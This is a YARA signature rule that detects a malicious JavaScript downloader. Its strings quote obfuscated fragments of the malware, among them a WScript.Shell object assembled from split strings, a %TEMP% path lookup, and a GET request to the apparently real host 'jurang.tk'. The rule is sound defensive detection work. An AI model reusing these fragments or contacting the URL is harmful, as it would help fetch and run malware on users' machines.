rule sig_20160427_3998b7898776a7f83bef92cd0583b238 {
  meta:
    description = "datamaliciousorder - file 20160427_3998b7898776a7f83bef92cd0583b238.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dc18453e59c18388ab3f86712df1769b7563cfdb35b2a741fdce432e76e2ab38"

  strings:
    $s1  = "function LhygxZqrmz() {return WltlgKqhrg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"TwPhHzr" ascii
    $s2  = "function LhygxZqrmz() {return WltlgKqhrg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"TwPhHzr" ascii
    $s3  = "function BopsrSmlns(FttjlVjzdi, OixowQeojd){EjofpUdfex = EjofpUdfex * 1; return FttjlVjzdi - OixowQeojd;};" fullword ascii
    $s4  = "var WltlgKqhrg = function HazvlRxxik() {return OqssfKcjml[NflihRmytj](\"WScript\"+\".Shell\");}(), TneziTtynf = 11;" fullword ascii
    $s5  = "BbuyjEheuu[JnwllMzgoj](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var OqssfKcjml = this[\"WScript\"];" fullword ascii
    $s7  = "function FtrsfJebio(){return NcirdCsqje + \"\";};" fullword ascii
    $s8  = "if (BbuyjEheuu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JhdqiNipjq() {return ((IzzuvDzsrr == true) && (IzzuvDzsrr == AltnnQxojj)) ? 1 : EjofpUdfex;};" fullword ascii
    $s10 = "var AltnnQxojj = false;" fullword ascii
    $s11 = "var IzzuvDzsrr = false;" fullword ascii
    $s12 = "var EozzeCrxts = false;" fullword ascii
    $s13 = "return BopsrSmlns(UerdbOdops, AxiimMvzgf);" fullword ascii
    $s14 = "function XzjfxRjdlq()" fullword ascii
    $s15 = "AltnnQxojj = true; " fullword ascii
    $s16 = "EozzeCrxts = true;" fullword ascii
    $s17 = "function WcowhNgbwk(){return 23;};" fullword ascii
    $s18 = "function JtfyrEjdfk(BxjulSusoa) {var WtshlPdjqd = (1, 2, 3, 4, 5, BxjulSusoa); return WtshlPdjqd;};" fullword ascii
    $s19 = "}while (KxbzkCxghg);" fullword ascii
    $s20 = "IzzuvDzsrr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}